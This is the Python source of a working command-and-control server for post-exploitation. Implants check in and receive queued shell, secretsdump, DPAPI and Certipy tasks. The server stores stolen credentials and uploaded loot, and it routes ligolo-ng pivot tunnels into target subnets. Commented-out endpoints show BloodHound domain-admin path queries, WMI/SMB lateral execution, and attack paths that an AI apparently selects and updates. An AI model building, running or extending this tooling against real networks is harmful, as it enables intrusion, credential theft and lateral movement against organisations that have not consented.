from fastapi import FastAPI, HTTPException, UploadFile, File, Form, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional
import json
import os
import requests
from database import init_db, migrate_db, ensure_server_agent, get_conn
# from impacket_wrapper import wmi_exec, smb_exec   # disabled — lateral movement via agent tools
from pivot_manager import ensure_interface, add_route, del_route
# import bloodhound_client as bh                    # disabled — BH queries done via SharpHound on agent

app = FastAPI()

N8N_WEBHOOK_URL = os.getenv("N8N_WEBHOOK_URL", "http://127.0.0.1:5678/webhook/c2-events")

def _notify_n8n(event: str, payload: dict):
    """Fire-and-forget webhook notification to n8n. Never raises."""
    try:
        requests.post(N8N_WEBHOOK_URL, json={"event": event, **payload}, timeout=5)
    except Exception:
        pass


FILES_DIR = os.path.join(os.path.dirname(__file__), "files")
LOOT_DIR  = os.path.join(os.path.dirname(__file__), "loot")
os.makedirs(FILES_DIR, exist_ok=True)
os.makedirs(LOOT_DIR,  exist_ok=True)
app.mount("/files", StaticFiles(directory=FILES_DIR), name="files")


@app.on_event("startup")
def startup():
    init_db()
    migrate_db()
    ensure_server_agent()


# ── Models ────────────────────────────────────────────────────────────────────

class AgentCheckin(BaseModel):
    agent_id: str
    hostname: str
    username: str
    ip: str = ""

class TaskResult(BaseModel):
    task_id: int
    agent_id: str
    output: str

class NewTask(BaseModel):
    agent_id: str
    instruction: str
    task_type: str = "shell"   # shell | recon | sharphound | certipy | secretsdump | dpapi | authenticate

class NewRecon(BaseModel):
    agent_id: str
    target: str     # single IP or CIDR (e.g. "10.0.2.5" or "10.0.2.0/24")

class NewCredential(BaseModel):
    agent_id: str
    username: str
    secret: str
    cred_type: str          # e.g. "plaintext", "ntlm", "ticket"
    source_host: str

class TunnelRegister(BaseModel):
    agent_id:  str
    subnet:    str        # CIDR, e.g. "10.0.2.0/24"
    interface: str = "ligolo"


# ── Agent endpoints ───────────────────────────────────────────────────────────

@app.post("/checkin")
def checkin(data: AgentCheckin, background_tasks: BackgroundTasks):
    with get_conn() as conn:
        # Detect new agent before upsert
        existing = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        is_new = existing is None

        # Upsert agent
        conn.execute("""
            INSERT INTO agents (agent_id, hostname, username, ip)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(agent_id) DO UPDATE SET
                last_seen = datetime('now'),
                hostname  = excluded.hostname,
                username  = excluded.username,
                ip        = excluded.ip
        """, (data.agent_id, data.hostname, data.username, data.ip))

        # Grab oldest pending task for this agent
        row = conn.execute("""
            SELECT task_id, task_type, instruction FROM tasks
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY task_id ASC
            LIMIT 1
        """, (data.agent_id,)).fetchone()

        if row:
            conn.execute(
                "UPDATE tasks SET status = 'sent' WHERE task_id = ?",
                (row["task_id"],)
            )

    if is_new:
        print(f"[+] New agent: {data.username}@{data.hostname} ({data.ip})")
        background_tasks.add_task(_notify_n8n, "agent_new", {
            "agent_id": data.agent_id,
            "hostname": data.hostname,
            "username": data.username,
            "ip":       data.ip
        })
    else:
        print(f"[*] Check-in: {data.username}@{data.hostname} ({data.ip})")

    if row:
        print(f"    → task {row['task_id']} [{row['task_type']}]: {row['instruction']}")
        return {"task_id": row["task_id"], "task_type": row["task_type"], "instruction": row["instruction"]}

    return {"task_id": None, "task_type": None, "instruction": None}


@app.post("/result")
def receive_result(data: TaskResult, background_tasks: BackgroundTasks):
    with get_conn() as conn:
        task = conn.execute(
            "SELECT task_id, task_type FROM tasks WHERE task_id = ? AND agent_id = ?",
            (data.task_id, data.agent_id)
        ).fetchone()
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")

        conn.execute(
            "UPDATE tasks SET status = 'completed' WHERE task_id = ?",
            (data.task_id,)
        )
        conn.execute(
            "INSERT INTO results (task_id, agent_id, output) VALUES (?, ?, ?)",
            (data.task_id, data.agent_id, data.output)
        )

        if task["task_type"] == "recon":
            _store_recon_hosts(conn, data.agent_id, data.output)

    print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")

    background_tasks.add_task(_notify_n8n, "task_result", {
        "task_id":   data.task_id,
        "agent_id":  data.agent_id,
        "task_type": task["task_type"],
        "output":    data.output
    })

    return {"status": "ok"}


def _store_recon_hosts(conn, agent_id: str, output: str):
    try:
        data = json.loads(output)
        for host in data.get("hosts", []):
            port_list = host.get("ports", [])
            open_ports = ",".join(str(p["port"]) for p in port_list)
            services   = json.dumps(port_list)
            hostname   = host.get("hostname", "")
            conn.execute("""
                INSERT INTO hosts (ip, hostname, open_ports, services, discovered_by)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(ip) DO UPDATE SET
                    hostname      = excluded.hostname,
                    open_ports    = excluded.open_ports,
                    services      = excluded.services,
                    discovered_by = excluded.discovered_by,
                    discovered_at = datetime('now')
            """, (host["ip"], hostname, open_ports, services, agent_id))
        print(f"[+] Recon stored {len(data.get('hosts', []))} hosts")
    except Exception as e:
        print(f"[-] Failed to parse recon result: {e}")


# ── File upload (agent → server) ──────────────────────────────────────────────

@app.post("/upload")
async def upload_file(background_tasks: BackgroundTasks, agent_id: str = Form(...), file: UploadFile = File(...)):
    """Agent uploads a file to the server (e.g. SharpHound ZIP output)."""
    agent_dir = os.path.join(LOOT_DIR, agent_id)
    os.makedirs(agent_dir, exist_ok=True)

    dest = os.path.join(agent_dir, file.filename)
    content = await file.read()
    with open(dest, "wb") as f:
        f.write(content)

    print(f"[+] Upload from {agent_id}: {file.filename} ({len(content)} bytes) → {dest}")

    background_tasks.add_task(_notify_n8n, "file_uploaded", {
        "agent_id": agent_id,
        "filename": file.filename,
        "size":     len(content),
        "path":     dest
    })

    return {"status": "ok", "filename": file.filename, "size": len(content)}


@app.get("/loot")
def list_loot():
    """List all files uploaded by agents."""
    result = {}
    if not os.path.isdir(LOOT_DIR):
        return result
    for agent_id in os.listdir(LOOT_DIR):
        agent_dir = os.path.join(LOOT_DIR, agent_id)
        if os.path.isdir(agent_dir):
            result[agent_id] = os.listdir(agent_dir)
    return result


# ── Operator endpoints ────────────────────────────────────────────────────────

@app.get("/agents")
def list_agents():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/task")
def queue_task(data: NewTask):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction) VALUES (?, ?, ?)",
            (data.agent_id, data.task_type, data.instruction)
        )
    print(f"[*] Task [{data.task_type}] queued for {data.agent_id}: {data.instruction}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/results/{agent_id}")
def get_results(agent_id: str):
    with get_conn() as conn:
        rows = conn.execute("""
            SELECT r.result_id, r.task_id, t.task_type, t.instruction, r.output, r.received_at
            FROM results r
            JOIN tasks t ON r.task_id = t.task_id
            WHERE r.agent_id = ?
            ORDER BY r.received_at DESC
        """, (agent_id,)).fetchall()
    return [dict(r) for r in rows]


@app.post("/recon")
def queue_recon(data: NewRecon):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction) VALUES (?, 'recon', ?)",
            (data.agent_id, data.target)
        )
    print(f"[*] Recon task queued for {data.agent_id}: {data.target}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/hosts")
def list_hosts():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM hosts ORDER BY discovered_at DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/credentials")
def store_credential(data: NewCredential):
    with get_conn() as conn:
        conn.execute("""
            INSERT INTO credentials (agent_id, username, secret, cred_type, source_host)
            VALUES (?, ?, ?, ?, ?)
        """, (data.agent_id, data.username, data.secret, data.cred_type, data.source_host))
    print(f"[+] Credential stored: {data.username} ({data.cred_type}) from {data.source_host}")
    return {"status": "ok"}


@app.get("/credentials")
def list_credentials():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM credentials ORDER BY harvested_at DESC").fetchall()
    return [dict(r) for r in rows]


# ── Pivot endpoints ───────────────────────────────────────────────────────────

@app.post("/pivot/tunnel")
def register_tunnel(data: TunnelRegister):
    """
    Register a ligolo-ng tunnel after the operator has connected the session
    in the ligolo-ng console (session → start). Automatically adds the kernel
    route so all tools on the operator machine can reach the target subnet.
    """
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

    iface = ensure_interface(data.interface)
    if not iface["ok"]:
        raise HTTPException(status_code=500, detail=f"Failed to create interface: {iface['error']}")
    if iface["created"]:
        print(f"[*] TUN interface '{data.interface}' created")

    route = add_route(data.subnet, data.interface)
    if not route["ok"]:
        raise HTTPException(status_code=500, detail=f"Failed to add route: {route['error']}")

    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO tunnels (agent_id, interface, subnet) VALUES (?, ?, ?)",
            (data.agent_id, data.interface, data.subnet)
        )
        tunnel_id = cur.lastrowid

    print(f"[+] Tunnel registered: {data.subnet} via {data.interface} (agent: {data.agent_id})")
    return {"tunnel_id": tunnel_id, "agent_id": data.agent_id,
            "subnet": data.subnet, "interface": data.interface, "status": "active"}


@app.delete("/pivot/tunnel/{tunnel_id}")
def remove_tunnel(tunnel_id: int):
    """Mark a tunnel as down and remove the kernel route."""
    with get_conn() as conn:
        tunnel = conn.execute(
            "SELECT * FROM tunnels WHERE tunnel_id = ?", (tunnel_id,)
        ).fetchone()
        if not tunnel:
            raise HTTPException(status_code=404, detail="Tunnel not found")

        del_route(tunnel["subnet"], tunnel["interface"])

        conn.execute(
            "UPDATE tunnels SET status = 'down' WHERE tunnel_id = ?", (tunnel_id,)
        )

    print(f"[*] Tunnel {tunnel_id} torn down ({tunnel['subnet']} via {tunnel['interface']})")
    return {"tunnel_id": tunnel_id, "status": "down"}


@app.get("/pivot/tunnels")
def list_tunnels():
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM tunnels ORDER BY created_at DESC"
        ).fetchall()
    return [dict(r) for r in rows]


# ── Disabled — BloodHound server-side querying (moved to SharpHound on agent) ─
#
# @app.get("/bloodhound/status")          — check Neo4j connection
# @app.post("/bloodhound/query")          — raw Cypher for AI
# @app.get("/bloodhound/da-paths")        — shortest paths to DA
# @app.get("/bloodhound/owned-paths")     — DA paths from owned nodes
# @app.get("/bloodhound/admins")          — AdminTo targets
# @app.get("/bloodhound/sessions")        — sessions on a computer
# @app.get("/bloodhound/kerberoastable")  — Kerberoastable accounts
# @app.get("/bloodhound/asreproastable")  — AS-REP Roastable accounts
# @app.post("/bloodhound/sync")           — dump Neo4j → loot DB
# @app.get("/bh/nodes")                   — query cached BH nodes
# @app.get("/bh/edges")                   — query cached BH edges
# @app.get("/bh/owned-edges")             — edges from owned accounts
# @app.post("/attack_paths")              — AI saves a path to pursue
# @app.get("/attack_paths")               — list attack paths
# @app.patch("/attack_paths/{id}")        — AI updates path status
# @app.post("/exec")                      — server-side WMI/SMB exec


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
